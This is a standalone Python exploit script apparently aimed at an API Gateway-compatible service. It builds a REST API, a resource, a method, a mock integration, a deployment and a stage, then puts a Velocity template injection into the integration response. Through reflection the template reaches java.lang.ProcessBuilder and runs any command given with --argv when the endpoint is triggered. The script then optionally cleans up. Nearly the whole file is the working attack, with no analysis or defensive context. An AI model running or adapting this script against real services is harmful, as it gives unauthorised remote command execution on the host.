import argparse
import json
import sys
import time
import urllib.error
import urllib.request


def request_json(method, base_url, path, body=None):
    data = None
    headers = {"Accept": "application/json"}
    if body is not None:
        data = json.dumps(body).encode()
        headers["Content-Type"] = "application/json"
    req = urllib.request.Request(base_url + path, data=data, headers=headers, method=method)
    try:
        with urllib.request.urlopen(req, timeout=15) as resp:
            raw = resp.read().decode("utf-8", errors="replace")
            status = resp.status
    except urllib.error.HTTPError as exc:
        raw = exc.read().decode("utf-8", errors="replace")
        status = exc.code
    try:
        parsed = json.loads(raw) if raw else None
    except json.JSONDecodeError:
        parsed = None
    return status, raw, parsed


def require(result, expected, action):
    status, raw, parsed = result
    if status != expected:
        raise RuntimeError(f"{action} failed: HTTP {status}: {raw[:500]}")
    if not isinstance(parsed, dict):
        raise RuntimeError(f"{action} returned non-object JSON: {raw[:500]}")
    return parsed


def vtl_string(value):
    return value.replace("\\", "\\\\").replace("'", "\\'")


def payload(argv):
    command_json = json.dumps(argv, separators=(",", ":"))
    return (
        "#set($pbClass=$util.getClass().forName('java.lang.ProcessBuilder'))\n"
        "#set($listClass=$util.getClass().forName('java.util.List'))\n"
        "#set($ctor=$pbClass.getConstructor($listClass))\n"
        f"#set($cmd=$util.parseJson('{vtl_string(command_json)}'))\n"
        "#set($pb=$ctor.newInstance($cmd))\n"
        "#set($p=$pb.start())\n"
        "#set($exit=$p.waitFor())\n"
        '{"ok":true,"exit":"$exit"}'
    )


def exploit(base_url, argv, cleanup):
    stamp = str(int(time.time()))
    template = payload(argv)
    api = require(request_json("POST", base_url, "/restapis", {"name": f"vtl-rce-{stamp}"}), 201, "create REST API")
    api_id = api["id"]
    print(f"[+] REST API id: {api_id}")
    resources = require(request_json("GET", base_url, f"/restapis/{api_id}/resources"), 200, "list resources")
    root_id = resources["item"][0]["id"]
    resource = require(request_json("POST", base_url, f"/restapis/{api_id}/resources/{root_id}", {"pathPart": "rce"}), 201, "create resource")
    resource_id = resource["id"]
    print(f"[+] Resource id: {resource_id}")
    require(request_json("PUT", base_url, f"/restapis/{api_id}/resources/{resource_id}/methods/GET", {"authorizationType": "NONE"}), 201, "create method")
    require(request_json("PUT", base_url, f"/restapis/{api_id}/resources/{resource_id}/methods/GET/responses/200", {"responseParameters": {}}), 201, "create method response")
    require(
        request_json(
            "PUT",
            base_url,
            f"/restapis/{api_id}/resources/{resource_id}/methods/GET/integration",
            {"type": "MOCK", "requestTemplates": {"application/json": '{"statusCode": 200}'}},
        ),
        201,
        "create integration",
    )
    require(
        request_json(
            "PUT",
            base_url,
            f"/restapis/{api_id}/resources/{resource_id}/methods/GET/integration/responses/200",
            {"selectionPattern": "", "responseTemplates": {"application/json": template}},
        ),
        201,
        "create integration response",
    )
    deployment = require(request_json("POST", base_url, f"/restapis/{api_id}/deployments", {"description": "vtl-rce"}), 201, "create deployment")
    deployment_id = deployment["id"]
    require(request_json("POST", base_url, f"/restapis/{api_id}/stages", {"stageName": "prod", "deploymentId": deployment_id}), 201, "create stage")
    status, raw, parsed = request_json("GET", base_url, f"/execute-api/{api_id}/prod/rce")
    if status != 200:
        raise RuntimeError(f"trigger failed: HTTP {status}: {raw[:500]}")
    print(f"[+] Trigger response: {raw.strip()}")
    if cleanup:
        deleted = request_json("DELETE", base_url, f"/restapis/{api_id}")
        print(f"[+] Cleanup delete REST API: HTTP {deleted[0]}")
    return parsed


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--host", required=True)
    parser.add_argument("--port", required=True, type=int)
    parser.add_argument("--scheme", default="http", choices=("http", "https"))
    parser.add_argument("--argv", nargs="+", required=True)
    parser.add_argument("--no-cleanup", action="store_true")
    args = parser.parse_args()
    try:
        exploit(f"{args.scheme}://{args.host}:{args.port}", args.argv, not args.no_cleanup)
        return 0
    except Exception as exc:
        print(f"[-] {exc}", file=sys.stderr)
        return 1


if __name__ == "__main__":
    raise SystemExit(main())
